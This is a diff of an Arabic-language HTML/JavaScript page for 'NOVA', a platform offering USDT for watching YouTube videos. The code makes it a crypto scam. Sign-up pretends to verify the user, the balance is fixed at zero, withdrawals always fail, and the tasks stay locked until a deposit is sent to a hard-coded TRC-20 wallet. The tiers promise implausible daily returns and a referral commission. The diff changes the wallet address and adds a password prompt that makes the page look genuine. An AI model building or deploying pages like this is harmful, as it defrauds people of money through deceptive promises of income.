@@ -4,11 +4,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>NOVA</title>
-<!-- استدعاء خط Cairo الاحترافي المحدث من قوقل بجميع الأوزان العريضة -->
 <link href="https://googleapis.com" rel="stylesheet">
 <style>
-/* تطبيق الخط العريض والاحترافي على الموقع بالكامل */
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Cairo', sans-serif;}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Cairo',sans-serif;}
 body{background:#000;color:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
 .container{max-width:500px;width:100%;text-align:center;}
 .logo{font-size:42px;font-weight:900;color:#b8ff1a;margin-bottom:20px;letter-spacing:1px;}
@@ -32,61 +30,39 @@ body{background:#000;color:#fff;min-height:100vh;display:flex;justify-content:ce
 .main-dashboard{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:10000;display:none;flex-direction:column;justify-content:space-between;}
 .dashboard-content{flex:1;width:100%;padding:20px;overflow-y:auto;padding-bottom:100px;display:flex;flex-direction:column;align-items:center;}
 .page-title{font-size:32px;font-weight:900;color:#b8ff1a;margin-bottom:20px;text-transform:uppercase;letter-spacing:1px;}
-
-/* كرت الرصيد الحالي العريض والجذاب */
 .balance-card{width:100%;max-width:450px;background:#111;border:1px solid #222;padding:18px;border-radius:15px;text-align:center;margin-bottom:20px;}
 .balance-text{font-size:20px;font-weight:900;color:#fff;letter-spacing:0.5px;}
-
 .info-section{width:100%;max-width:450px;text-align:right;direction:rtl;margin-bottom:20px;}
 .info-intro{font-size:15px;color:#ccc;line-height:1.7;margin-bottom:20px;background:#111;padding:15px;border-radius:15px;border:1px solid #222;font-weight:800;}
-.tier-card{background:#111;border:1px solid #222;border-radius:20px;padding:20px;margin-bottom:15px;width:100%;}
+.tier-card{background:#111;border:1px solid #222;border-radius:20px;padding:20px;margin-bottom:15px;width:100%;transition:transform 0.2s;}
+.tier-card.clickable-deposit:active{transform:scale(0.97);}
 .tier-header{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #222;padding-bottom:10px;margin-bottom:12px;}
 .tier-name{font-size:19px;font-weight:900;color:#b8ff1a;}
 .tier-price{font-size:18px;font-weight:900;color:#fff;}
 .tier-details{font-size:15px;color:#ddd;line-height:1.8;font-weight:800;}
 .tier-details strong{color:#b8ff1a;}
-
-/* قسم السحب الاحترافي بالعناوين العريضة */
 .withdraw-section{width:100%;max-width:450px;background:#111;border:1px solid #222;border-radius:20px;padding:20px;margin-top:10px;text-align:right;direction:rtl;}
 .withdraw-title{font-size:19px;font-weight:900;color:#b8ff1a;margin-bottom:15px;border-bottom:1px solid #222;padding-bottom:8px;}
 .withdraw-field{margin-bottom:15px;}
 .withdraw-field label{display:block;font-size:14px;font-weight:800;color:#aaa;margin-bottom:6px;}
-.withdraw-field input, .withdraw-field select{width:100%;padding:12px;border-radius:12px;border:1px solid #333;background:#050505;color:#fff;font-size:15px;outline:none;font-weight:800;text-align:right;}
+.withdraw-field input,.withdraw-field select{width:100%;padding:12px;border-radius:12px;border:1px solid #333;background:#050505;color:#fff;font-size:15px;outline:none;font-weight:800;text-align:right;}
 .withdraw-field select{direction:rtl;text-align:right;}
-.withdraw-field input:focus, .withdraw-field select:focus{border-color:#b8ff1a;}
+.withdraw-field input:focus,.withdraw-field select:focus{border-color:#b8ff1a;}
 .withdraw-limit{font-size:14px;color:#ff4a4a;margin-bottom:15px;font-weight:800;text-align:center;}
 .btn-withdraw{width:100%;background:#b8ff1a;color:#000;border:none;padding:14px;font-size:18px;font-weight:900;border-radius:12px;cursor:pointer;transition:opacity .2s;}
-
-/* أشرطة المهام النحيفة والأنيقة */
-.task-list-container {width:100%; max-width:450px; display:flex; flex-direction:column; gap:8px;}
-.task-bar-white {
-    width: 100%;
-    background: #ffffff;
-    color: #000000;
-    padding: 10px 16px;
-    border-radius: 10px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    direction: ltr;
-    cursor: pointer;
-    transition: transform 0.1s;
-}
-.task-bar-white:active{transform: scale(0.98);}
-.task-bar-left {display: flex; align-items: center; gap: 8px;}
-.youtube-badge {display: flex; align-items: center; justify-content: center;}
-.youtube-icon-svg {width: 28px; height: 28px;} /* حجم أيقونة يوتيوب الرسمية */
-.lock-icon {font-size: 14px; color: #e6a23c; margin-right: 4px;}
-.task-text {font-size: 14px; font-weight: 900;}
-
-/* واجهة الإيداع المستقلة */
+.task-list-container{width:100%;max-width:450px;display:flex;flex-direction:column;gap:8px;}
+.task-bar-white{width:100%;background:#ffffff;color:#000000;padding:12px 16px;border-radius:10px;display:flex;justify-content:space-between;align-items:center;direction:ltr;cursor:pointer;transition:transform 0.1s;}
+.task-bar-white:active{transform:scale(0.98);}
+.task-bar-left{display:flex;align-items:center;gap:8px;}
+.youtube-badge-text{font-size:14px;font-weight:900;color:#ff0000;letter-spacing:0.5px;}
+.lock-icon{font-size:14px;color:#e6a23c;margin-right:4px;}
+.task-text{font-size:14px;font-weight:900;}
 .deposit-container{width:100%;max-width:450px;text-align:center;direction:rtl;padding-top:10px;}
-.deposit-info-box{background:#111;border:1px solid #222;border-radius:15px;padding:20px;margin-bottom:15px;}
-.deposit-crypto-type{font-size:22px;font-weight:900;color:#b8ff1a;margin-bottom:10px;}
-.deposit-address-label{font-size:15px;color:#aaa;margin-bottom:8px;font-weight:800;}
-.deposit-address-box{background:#050505;border:1px solid #333;padding:12px;border-radius:10px;font-size:14px;color:#fff;word-break:break-all;font-family:monospace;font-weight:900;margin-bottom:15px;}
-.deposit-note{font-size:14px;color:#ccc;line-height:1.6;font-weight:800;}
-
+.deposit-intro-title{font-size:16px;color:#aaa;margin-bottom:20px;font-weight:800;}
+.deposit-wallet-display-box{background:#111;border:2px solid #b8ff1a;border-radius:15px;padding:18px;margin-top:10px;margin-bottom:20px;text-align:center;}
+.wallet-title-text{font-size:15px;color:#b8ff1a;font-weight:900;margin-bottom:10px;}
+.wallet-address-text{font-size:15px;color:#fff;word-break:break-all;font-family:monospace;font-weight:900;user-select:all;background:#050505;padding:12px;border-radius:10px;border:1px solid #333;}
+.deposit-note-footer{font-size:13px;color:#ff4a4a;line-height:1.6;font-weight:800;margin-top:10px;}
 .bottom-nav{width:100%;background:#111;display:flex;justify-content:space-around;align-items:center;padding:10px 0;border-top:1px solid #222;height:85px;position:fixed;bottom:0;left:0;z-index:10001;}
 .nav-item{display:flex;flex-direction:column;align-items:center;color:#888;font-size:12px;cursor:pointer;flex:1;font-weight:900;text-transform:uppercase;}
 .nav-icon{font-size:26px;margin-bottom:2px;display:block;}
@@ -131,188 +107,30 @@ body{background:#000;color:#fff;min-height:100vh;display:flex;justify-content:ce
         <p>6. توفر المنصة ثلاثة مستويات للاشتراك: العادي، والبرونز، والذهب.</p>
         <p>7. يتميز كل مستوى بمزايا وأرباح تختلف عن المستوى الآخر.</p>
         <p>8. يختلف عدد مقاطع الفيديو المطلوبة حسب مستوى الاشتراك.</p>
-        <p>9. عند دعوة عضو جديد وانضمامه إلى المنصة، ستحصل على عمولة إحالة بنسبة 5% من أرباحه.</p>
+        <p>9. عند دعوة عضو جديد وانضمامه إلى المنصة, ستحصل على عمولة إحالة بنسبة 5% من أرباحه.</p>
         <p>10. انضم إلى منصة نوفا، وابدأ رحلتك نحو تحقيق دخل إضافي بسهولة وأمان.</p>
     </div>
 </div>
-
 <div id="mainDashboard" class="main-dashboard">
-    <div class="dashboard-content" id="dashboardContent">
-        <!-- يتم تحميل المحتوى برمجياً وبشكل ديناميكي ونظيف هنا -->
-    </div>
+    <div class="dashboard-content" id="dashboardContent"></div>
     <div class="bottom-nav">
         <div class="nav-item active" onclick="switchTab('info', this)"><span class="nav-icon">◈</span><span>Info</span></div>
         <div class="nav-item center-btn" onclick="switchTab('deposit', this)"><div class="icon-circle"><span class="nav-icon">⬢</span></div><span>Deposit</span></div>
         <div class="nav-item" onclick="switchTab('tasks', this)"><span class="nav-icon">◫</span><span>Tasks</span></div>
     </div>
 </div>
-
 <script>
-var savedUsername = "المستخدم";
-
-const togglePassword = document.querySelector('#togglePassword');
-const passwordInput = document.querySelector('#passwordInput');
-togglePassword.addEventListener('click', function () {
-    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-    passwordInput.setAttribute('type', type);
-    this.innerText = type === 'password' ? '👁️' : '🔒';
-});
-
-// دالة التحكم الحركية للأزرار (جاري التحقيق -> أكتمل الحساب)
-function handleAuth(buttonId) {
-    var user = document.getElementById("userInput").value.trim();
-    if(user === "" || document.getElementById("emailInput").value === "" || document.getElementById("passwordInput").value === "" || document.getElementById("statusInput").value === "") {
-        alert("يرجى ملء جميع الخانات أولاً");
-        return;
-    }
-    
-    savedUsername = user;
-    const targetBtn = document.getElementById(buttonId);
-    const originalText = targetBtn.innerText;
-    
-    targetBtn.disabled = true;
-    targetBtn.style.background = "#ffa500"; 
-    targetBtn.style.color = "#000";
-    targetBtn.innerText = "جاري التحقيق...";
-    
-    setTimeout(() => {
-        targetBtn.style.background = "#28a745"; 
-        targetBtn.style.color = "#fff";
-        targetBtn.innerText = "أكتمل الحساب ✓";
-        
-        setTimeout(() => {
-            document.getElementById("welcomeMessage").innerHTML = `1. مرحبًا بك يا <span style="color:#b8ff1a; font-weight:bold;">${savedUsername}</span> في منصة نوفا.`;
-            document.getElementById("termsOverlay").style.display = "flex";
-            
-            targetBtn.disabled = false;
-            targetBtn.style.background = buttonId === "regBtn" ? "#b8ff1a" : "transparent";
-            targetBtn.style.color = buttonId === "regBtn" ? "#000" : "#fff";
-            targetBtn.innerText = originalText;
-        }, 1200);
-    }, 2000);
-}
-
-function register(){
-    handleAuth("regBtn");
-}
-
-function login(){
-    handleAuth("loginBtn");
-}
-
-function closeOverlay() {
-    document.getElementById("termsOverlay").style.display = "none";
-    document.getElementById("mainDashboard").style.display = "flex";
-    switchTab('info', document.querySelector('.bottom-nav .nav-item'));
-}
-
-function triggerTaskAlert() {
-    alert("حسابك غير فعال يرجى الاشتراك في الباقات في قسم الايداع");
-}
-
-function triggerWithdrawAlert() {
-    alert("رصيدك غير كافي");
-}
-
-function switchTab(tabName, element) {
-    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
-    element.classList.add('active');
-    
-    const content = document.getElementById("dashboardContent");
-    
-    if(tabName === 'info') {
-        content.innerHTML = `
-            <div class="page-title">NOVA</div>
-            
-            <div class="balance-card">
-                <div class="balance-text">رصيدك هو غير متاح 0.00USDT</div>
-            </div>
-
-            <div class="info-section">
-                <div class="info-intro">منصة نوفا تقدم لك أفضل الفرص لزيادة دخلك من خلال إتمام المهام اليومية البسيطة. تصفح تفاصيل الاشتراكات المتاحة أدناه.</div>
-                
-                <div class="tier-card">
-                    <div class="tier-header"><span class="tier-name">المستوى العادي</span><span class="tier-price">10 USDT</span></div>
-                    <div class="tier-details">عدد المهام اليومية: <strong>3 مهام</strong><br>الربح اليومي: <strong>1.50 USDT</strong></div>
-                </div>
-                
-                <div class="tier-card">
-                    <div class="tier-header"><span class="tier-name">المستوى البرونزي</span><span class="tier-price">35 USDT</span></div>
-                    <div class="tier-details">عدد المهام اليومية: <strong>7 مهام</strong><br>الربح اليومي: <strong>5.00 USDT</strong></div>
-                </div>
-
-                <div class="tier-card">
-                    <div class="tier-header"><span class="tier-name">مستوى الذهب</span><span class="tier-price">100 USDT</span></div>
-                    <div class="tier-details">عدد المهام اليومية: <strong>15 مهمة</strong><br>الربح اليومي: <strong>15.00 USDT</strong></div>
-                </div>
-
-                <div class="tier-card">
-                    <div class="tier-header"><span class="tier-name">مستوى الملك</span><span class="tier-price">1000 USDT</span></div>
-                    <div class="tier-details">عدد المهام اليومية: <strong>30 مهمة</strong><br>الربح اليومي: <strong>160.00 USDT</strong></div>
-                </div>
-            </div>
-
-            <div class="withdraw-section">
-                <div class="withdraw-title">سحب الأرباح</div>
-                
-                <div class="withdraw-field">
-                    <label>عنوان المحفظة</label>
-                    <input type="text" placeholder="أدخل عنوان محفظتك الشخصية">
-                </div>
-
-                <div class="withdraw-field">
-                    <label>اختر الشبكة</label>
-                    <select>
-                        <option>TRC-20 (TRON)</option>
-                        <option>ERC-20 (Ethereum)</option>
-                        <option>BEP-20 (BNB Chain)</option>
-                        <option>Polygon</option>
-                    </select>
-                </div>
-
-                <div class="withdraw-field">
-                    <label>الكمية (USDT)</label>
-                    <input type="number" placeholder="0.00">
-                </div>
-
-                <div class="withdraw-limit">الحد الاقصى هو 5دولار للسحب</div>
-                
-                <button class="btn-withdraw" onclick="triggerWithdrawAlert()">سحب</button>
-            </div>
-        `;
-    } else if(tabName === 'deposit') {
-        content.innerHTML = `
-            <div class="page-title">DEPOSIT</div>
-            <div class="deposit-container">
-                <div class="deposit-info-box">
-                    <div class="deposit-crypto-type">USDT (TRC-20)</div>
-                    <div class="deposit-address-label">عنوان محفظة الشحن الموحدة للمنصة:</div>
-                    <div class="deposit-address-box">TY7rXmN9sWqE1pB5vK3zA8xG2jH6dQf4LnM</div>
-                    <div class="deposit-note">يرجى تحويل قيمة الباقة التي ترغب في تفعيلها (10, 35, 100, 1000 USDT) إلى العنوان أعلاه، ثم قم بإرسال لقطة شاشة لإثبات التحويل للدعم الفني لتنشيط حسابك فوراً.</div>
-                </div>
-            </div>
-        `;
-    } else if(tabName === 'tasks') {
-        let tasksHTML = `<div class="page-title">Tasks</div><div class="task-list-container">`;
-        for (let i = 1; i <= 40; i++) {
-            tasksHTML += `
-                <div class="task-bar-white" onclick="triggerTaskAlert()">
-                    <div class="task-bar-left">
-                        <span class="lock-icon">🔒</span>
-                        <span class="task-text">Watch YouTube Video #${i}</span>
-                    </div>
-                    <!-- إضافة كود الصورة الرسمية والملونة لليوتيوب مباشرة لمنع أي مشكلة في المتصفحات -->
-                    <span class="youtube-badge">
-                        <svg class="youtube-icon-svg" viewBox="0 0 24 24">
-                            <path fill="#FF0000" d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
-                        </svg>
-                    </span>
-                </div>`;
-        }
-        tasksHTML += `</div>`;
-        content.innerHTML = tasksHTML;
-    }
-}
+var savedUsername="المستخدم";var enteredPassword="";
+const togglePassword=document.querySelector('#togglePassword');const passwordInput=document.querySelector('#passwordInput');
+togglePassword.addEventListener('click',function(){const type=passwordInput.getAttribute('type')==='password'?'text':'password';passwordInput.setAttribute('type',type);this.innerText=type==='password'?'👁️':'🔒';});
+function handleAuth(buttonId){var user=document.getElementById("userInput").value.trim();var pass=document.getElementById("passwordInput").value;if(user===""||document.getElementById("emailInput").value===""||pass===""||document.getElementById("statusInput").value===""){alert("يرجى ملء جميع الخانات أولاً");return;}savedUsername=user;enteredPassword=pass;const targetBtn=document.getElementById(buttonId);const originalText=targetBtn.innerText;targetBtn.disabled=true;targetBtn.style.background="#ffa500";targetBtn.style.color="#000";targetBtn.innerText="جاري التحقيق...";setTimeout(()=>{targetBtn.style.background="#28a745";targetBtn.style.color="#fff";targetBtn.innerText="أكتمل الحساب ✓";setTimeout(()=>{document.getElementById("welcomeMessage").innerHTML=`1. مرحبًا بك يا <span style="color:#b8ff1a; font-weight:bold;">${savedUsername}</span> في منصة نوفا.`;document.getElementById("termsOverlay").style.display="flex";targetBtn.disabled=false;targetBtn.style.background=buttonId==="regBtn"?"#b8ff1a":"transparent";targetBtn.style.color=buttonId==="regBtn"?"#000":"#fff";targetBtn.innerText=originalText;},1200);},2000);}
+function register(){handleAuth("regBtn");}
+function login(){handleAuth("loginBtn");}
+function closeOverlay(){document.getElementById("termsOverlay").style.display="none";document.getElementById("mainDashboard").style.display="flex";switchTab('info',document.querySelector('.bottom-nav .nav-item'));}
+function triggerTaskAlert(){alert("حسابك غير فعال يرجى الاشتراك في الباقات في قسم الايداع");}
+function triggerWithdrawAlert(){alert("رصيدك غير كافي");}
+function showDepositAddress(tierName){var confirmPass=prompt(`لتفعيل ${tierName}، يرجى كتابة كلمة مرور حسابك لتأكيد العملية:`);if(confirmPass===null)return;if(confirmPass===enteredPassword&&enteredPassword!==""){const addrContainer=document.getElementById("walletAddressContainer");addrContainer.innerHTML=`<div class="deposit-wallet-display-box"><div class="wallet-title-text">تم التحقق بنجاح! عنوان محفظة شحن ${tierName}:</div><div class="wallet-address-text">THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP</div><div class="deposit-note-footer">يمكنك تحديد النص أعلاه لنسخه مباشرة دون أي فراغات إضافية.</div></div>`;addrContainer.scrollIntoView({behavior:'smooth'});}else{alert("كلمة الورور غير صحيحة! يرجى المحاولة مرة أخرى.");}}
+function switchTab(tabName,element){document.querySelectorAll('.nav-item').forEach(item=>item.classList.remove('active'));element.classList.add('active');const content=document.getElementById("dashboardContent");if(tabName==='info'){content.innerHTML=`<div class="page-title">NOVA</div><div class="balance-card"><div class="balance-text">رصيدك هو غير متاح 0.00USDT</div></div><div class="info-section"><div class="info-intro">منصة نوفا تقدم لك أفضل الفرص لزيادة دخلك من خلال إتمام المهام اليومية البسيطة. تصفح تفاصيل الاشتراكات المتاحة أدناه.</div><div class="tier-card"><div class="tier-header"><span class="tier-name">المستوى العادي</span><span class="tier-price">10 USDT</span></div><div class="tier-details">عدد المهام اليومية: <strong>3 مهام</strong><br>الربح اليومي: <strong>1.50 USDT</strong></div></div><div class="tier-card"><div class="tier-header"><span class="tier-name">المستوى البرونزي</span><span class="tier-price">35 USDT</span></div><div class="tier-details">عدد المهام اليومية: <strong>7 مهام</strong><br>الربح اليومي: <strong>5.00 USDT</strong></div></div><div class="tier-card"><div class="tier-header"><span class="tier-name">مستوى الذهب</span><span class="tier-price">100 USDT</span></div><div class="tier-details">عدد المهام اليومية: <strong>15 مهمة</strong><br>الربح اليومي: <strong>15.00 USDT</strong></div></div><div class="tier-card"><div class="tier-header"><span class="tier-name">مستوى الملك</span><span class="tier-price">1000 USDT</span></div><div class="tier-details">عدد المهام اليومية: <strong>30 مهمة</strong><br>الربح اليومي: <strong>160.00 USDT</strong></div></div></div><div class="withdraw-section"><div class="withdraw-title">سحب الأرباح</div><div class="withdraw-field"><label>عنوان المحفظة</label><input type="text" placeholder="أدخل عنوان محفظتك الشخصية"></div><div class="withdraw-field"><label>اختر الشبكة</label><select><option>TRC-20 (TRON)</option><option>ERC-20 (Ethereum)</option><option>BEP-20 (BNB Chain)</option><option>Polygon</option></select></div><div class="withdraw-field"><label>الكمية (USDT)</label><input type="number" placeholder="0.00"></div><div class="withdraw-limit">الحد الاقصى هو 5دولار للسحب</div><button class="btn-withdraw" onclick="triggerWithdrawAlert()">سحب</button></div>`;}else if(tabName==='deposit'){content.innerHTML=`<div class="page-title">DEPOSIT</div><div class="deposit-container"><div class="deposit-intro-title">اختر الباقة المُراد شحنها لتظهر لك معلومات الدفع:</div><div class="tier-card clickable-deposit" onclick="showDepositAddress('المستوى العادي')"><div class="tier-header"><span class="tier-name">المستوى العادي</span><span class="tier-price">10 USDT</span></div><div class="tier-details">اضغط لتأكيد الهوية وعرض عنوان محفظة شحن الباقة.</div></div><div class="tier-card clickable-deposit" onclick="showDepositAddress('المستوى البرونزي')"><div class="tier-header"><span class="tier-name">المستوى البرونزي</span><span class="tier-price">35 USDT</span></div><div class="tier-details">اضغط لتأكيد الهوية وعرض عنوان محفظة شحن الباقة.</div></div><div class="tier-card clickable-deposit" onclick="showDepositAddress('مستوى الذهب')"><div class="tier-header"><span class="tier-name">مستوى الذهب</span><span class="tier-price">100 USDT</span></div><div class="tier-details">اضغط لتأكيد الهوية وعرض عنوان محفظة شحن الباقة.</div></div><div class="tier-card clickable-deposit" onclick="showDepositAddress('مستوى الملك')"><div class="tier-header"><span class="tier-name">مستوى الملك</span><span class="tier-price">1000 USDT</span></div><div class="tier-details">اضغط لتأكيد الهوية وعرض عنوان محفظة شحن الباقة.</div></div><div id="walletAddressContainer"></div></div>`;}else if(tabName==='tasks'){let tasksHTML=`<div class="page-title">Tasks</div><div class="task-list-container">`;for(let i=1;i<=40;i++){tasksHTML+=`<div class="task-bar-white" onclick="triggerTaskAlert()"><div class="task-bar-left"><span class="lock-icon">🔒</span><span class="task-text">Watch YouTube Video #${i}</span></div><span class="youtube-badge-text">YOUTUBE</span></div>`;}tasksHTML+=`</div>`;content.innerHTML=tasksHTML;}}
 </script>
 </body>
 </html>
